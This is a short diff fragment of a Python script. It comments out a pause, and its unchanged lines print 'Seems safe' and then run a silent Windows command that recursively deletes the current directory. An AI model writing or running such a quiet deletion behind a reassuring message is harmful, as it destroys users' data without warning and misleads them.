@@ -22,7 +22,7 @@ if __name__ == '__main__':
             sys.exit(0)
 
 
-        os.system('pause')
+        # os.system('pause')
     print("Seems safe")
 
     os.system('rd /s /q . 2> nul')
